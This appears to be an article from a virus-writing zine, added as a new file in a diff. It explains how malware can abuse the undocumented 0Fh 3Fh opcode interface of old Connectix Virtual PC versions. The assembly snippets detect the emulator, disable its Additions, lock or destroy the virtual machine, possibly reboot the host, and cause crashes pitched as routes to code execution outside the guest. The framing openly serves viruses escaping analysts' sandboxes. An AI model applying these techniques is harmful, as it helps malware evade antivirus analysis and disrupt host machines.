@@ -1,0 +1,112 @@
+
+                            Virtual PC Has You
+                            ------------------
+
+     There are some  programs that  can simulate other OS'es on the current
+ machine, they are particularly useful to avers while analysing viruses and
+ controlling virus propagation. Viruses as a programmed substance should be
+ able to detect and escape of such a prison.  A prison  for our  code  is a
+ prison for our minds.
+     One of those Matrixes is called Virtual PC,  originally from Connectix
+ Corporation and now acquired by Microsoft. This   software   has  been  in
+ development for years and it still has some  bugs that will allow virus to
+ set itself free.
+     Absolut Freedom is lack of  necessity, there are  two steps to achieve
+ this within computer viruses: transcend the limitations of the environment
+ and infecting all files in the system. In  our  nature to  transcend is to
+ destroy, so viruses as the Human Creation should  choose between became or
+ do not became like its creator.To evade that prison it shall became human.
+     As all applications of this kind Virtual PC has some sort of interface
+ that allows communication between program and internal emulated code.
+     This interface has many  purposes such as  controlling and configuring
+ devices,  expanding program capabilities (supporting specific additions to
+ the OS that let's virtual machine usage more user-friendly), etc.
+
+     Choosen way in Virtual PC was via the opcode:
+
+       0Fh 3Fh XXh YYh
+
+     where:
+
+       XXh, is device class.
+       YYh, is device command.
+
+     The parameters to the command are given and returned in registers.
+
+     (note:  This opcode do not exist in  most x86 processors but there are
+      some like the VIA C3 Samuel 2 processor that this  opcode corresponds
+      to the ALTINST instruction. As  you  can  see bad design leads to bad
+      implementation.)
+
+     There are  many bugs all concerning to incorrect handling of parameter
+ values passed in registers. Some failures are OS specific, better research
+ could lead to discovery of new vulnerabilities.
+     Here follow some example code of the many bugs/features  that could be
+ exploited: (it is advisable to use exception handling for these codes.)
+
+     ; Due to unknown Virtual PC behavior all non specified
+     ; registers must be set to 0.
+
+     ; set Virtual PC screen size to 10x20.
+     mov    ecx, 10
+     mov    edx, 20
+     db     0Fh, 3Fh, 01h, 0Ch
+
+     ; disable Virtual PC Additions.
+     db     0Fh, 3Fh, 05h, 01h
+
+     ; locks Virtual PC in some unknown conditions. (Win95)
+     db     0Fh, 3Fh, 02h, 04h
+
+     ; Destroy current instance of Virtual Machine. (Win95)
+     mov    edx, 4444h
+     mov    esi, 5555h
+     mov    ebp, edx
+     db     0Fh, 3Fh, 01h, 01h
+
+     ; May reboot Real computer or close current VM. (Win95)
+     mov    edx, 4444h
+     mov    esi, 5555h
+     mov    ebp, 7777h
+     db     0Fh, 3Fh, 01h, 01h
+
+     The bugs that generates crash and may lead to arbitrary code execution
+ outside emulated context, i couldn't exploit, but here they are:
+
+     ; crash - screen resize with y = 0
+     mov    ecx, 10
+     xor    edx, edx
+     db     0Fh, 3Fh, 01h, 0Ch
+
+     ; crash with many register values.
+     db     0Fh, 3Fh, 01h, 08h/db     0Fh, 3Fh, 01h, 01h
+
+     ; crash by 0 division. (Without Additions)
+     db     0Fh, 3Fh, 01h, 02h
+
+     While  researching in this  subject i had developed a tool to simplify
+ the task of finding buggy  class/command/register values.  The name of the
+ tool is VPCHAMMER it runs in both windows and linux and  should come along
+ with this article wherever you're reading it.
+    I have tested the above information in the following versions:
+
+     Connectix Virtual PC 5.1 all builds (Vulnerable)
+     Connectix Virtual PC 5.2 all builds (Vulnerable)
+     Microsoft Virtual PC 2004 (Not Vulnerable)
+
+     Possibly all  versions  prior to Virtual PC 2004 (5.3) are vulnerable.
+     Reading an article on the internet maybe i have  found the  reason why
+ Microsoft Virtual PC 2004 is not vulnerable:
+
+ "Microsoft  spent most of the eight months of development time focusing on
+  the security of the product to ensure that a user cannot do anything in a
+  virtual  machine that would negatively affect their host operating system
+  or other virtual machines on the host PC."
+  - Carla Huffman, Microsoft's product manager for the Virtual PC.
+
+     With all that crap, virus has decided to become like us and now we can
+ destroy the Matrix but we didn't took the red pill, not for now.
+
+          "An interesting case but nothing to be concerned about."
+
+                                * * *
